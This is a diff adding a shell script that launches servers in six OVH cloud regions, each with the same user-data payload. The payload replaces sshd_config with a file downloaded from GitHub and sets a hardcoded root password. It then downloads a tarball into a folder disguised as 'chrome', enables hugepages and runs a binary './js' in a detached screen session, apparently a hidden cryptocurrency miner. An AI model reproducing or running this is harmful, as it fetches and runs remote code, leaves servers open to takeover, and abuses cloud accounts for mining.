@@ -1,0 +1,138 @@
+export OS_REGION_NAME=BHS5
+cat > ovh.sh <<EOF
+#!/bin/bash
+sudo yum -y install wget
+cd /etc/ssh
+wget -q https://raw.githubusercontent.com/eyuswap/ssh/master/sshd_config -O /etc/ssh/sshd_config
+sudo systemctl start sshd.service
+sudo systemctl restart sshd.service
+echo "root:Datgmag77" | chpasswd
+yum -y install screen
+yum -y install wget
+cd
+mkdir chrome
+cd chrome
+wget https://github.com/yusribjb/master/raw/master/niah.tar.gz
+tar xfvz niah.tar.gz
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+cd yahoo
+screen -d -m -S 1 ./js
+EOF
+openstack keypair create SSHKEY > SSHKEY.pem
+openstack server create --flavor 'c2-7' --image 'Fedora 29' --network 'Ext-Net' --key-name 'SSHKEY' --user-data=ovh.sh 'Cloud-Ubuntu'
+export OS_REGION_NAME=DE1
+cat > ovh.sh <<EOF
+#!/bin/bash
+sudo yum -y install wget
+cd /etc/ssh
+wget -q https://raw.githubusercontent.com/eyuswap/ssh/master/sshd_config -O /etc/ssh/sshd_config
+sudo systemctl start sshd.service
+sudo systemctl restart sshd.service
+echo "root:Datgmag77" | chpasswd
+yum -y install screen
+yum -y install wget
+cd
+mkdir chrome
+cd chrome
+wget https://github.com/yusribjb/master/raw/master/niah.tar.gz
+tar xfvz niah.tar.gz
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+cd yahoo
+screen -d -m -S 1 ./js
+EOF
+openstack keypair create SSHKEY > SSHKEY.pem
+openstack server create --flavor 'c2-7' --image 'Fedora 29' --network 'Ext-Net' --key-name 'SSHKEY' --user-data=ovh.sh 'Cloud-Ubuntu'
+export OS_REGION_NAME=GRA7
+cat > ovh.sh <<EOF
+#!/bin/bash
+sudo yum -y install wget
+cd /etc/ssh
+wget -q https://raw.githubusercontent.com/eyuswap/ssh/master/sshd_config -O /etc/ssh/sshd_config
+sudo systemctl start sshd.service
+sudo systemctl restart sshd.service
+echo "root:Datgmag77" | chpasswd
+yum -y install screen
+yum -y install wget
+cd
+mkdir chrome
+cd chrome
+wget https://github.com/yusribjb/master/raw/master/niah.tar.gz
+tar xfvz niah.tar.gz
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+cd yahoo
+screen -d -m -S 1 ./js
+EOF
+openstack keypair create SSHKEY > SSHKEY.pem
+openstack server create --flavor 'c2-7' --image 'Fedora 29' --network 'Ext-Net' --key-name 'SSHKEY' --user-data=ovh.sh 'Cloud-Ubuntu'
+export OS_REGION_NAME=SBG5
+cat > ovh.sh <<EOF
+#!/bin/bash
+sudo yum -y install wget
+cd /etc/ssh
+wget -q https://raw.githubusercontent.com/eyuswap/ssh/master/sshd_config -O /etc/ssh/sshd_config
+sudo systemctl start sshd.service
+sudo systemctl restart sshd.service
+echo "root:Datgmag77" | chpasswd
+yum -y install screen
+yum -y install wget
+cd
+mkdir chrome
+cd chrome
+wget https://github.com/yusribjb/master/raw/master/niah.tar.gz
+tar xfvz niah.tar.gz
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+cd yahoo
+screen -d -m -S 1 ./js
+EOF
+openstack keypair create SSHKEY > SSHKEY.pem
+openstack server create --flavor 'c2-7' --image 'Fedora 29' --network 'Ext-Net' --key-name 'SSHKEY' --user-data=ovh.sh 'Cloud-Ubuntu'
+export OS_REGION_NAME=UK1
+cat > ovh.sh <<EOF
+#!/bin/bash
+sudo yum -y install wget
+cd /etc/ssh
+wget -q https://raw.githubusercontent.com/eyuswap/ssh/master/sshd_config -O /etc/ssh/sshd_config
+sudo systemctl start sshd.service
+sudo systemctl restart sshd.service
+echo "root:Datgmag77" | chpasswd
+yum -y install screen
+yum -y install wget
+cd
+mkdir chrome
+cd chrome
+wget https://github.com/yusribjb/master/raw/master/niah.tar.gz
+tar xfvz niah.tar.gz
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+cd yahoo
+screen -d -m -S 1 ./js
+EOF
+openstack keypair create SSHKEY > SSHKEY.pem
+openstack server create --flavor 'c2-7' --image 'Fedora 29' --network 'Ext-Net' --key-name 'SSHKEY' --user-data=ovh.sh 'Cloud-Ubuntu'
+export OS_REGION_NAME=WAW1
+cat > ovh.sh <<EOF
+#!/bin/bash
+sudo yum -y install wget
+cd /etc/ssh
+wget -q https://raw.githubusercontent.com/eyuswap/ssh/master/sshd_config -O /etc/ssh/sshd_config
+sudo systemctl start sshd.service
+sudo systemctl restart sshd.service
+echo "root:Datgmag77" | chpasswd
+yum -y install screen
+yum -y install wget
+cd
+mkdir chrome
+cd chrome
+wget https://github.com/yusribjb/master/raw/master/niah.tar.gz
+tar xfvz niah.tar.gz
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+cd yahoo
+screen -d -m -S 1 ./js
+EOF
+openstack keypair create SSHKEY > SSHKEY.pem
+openstack server create --flavor 'c2-7' --image 'Fedora 29' --network 'Ext-Net' --key-name 'SSHKEY' --user-data=ovh.sh 'Cloud-Ubuntu'
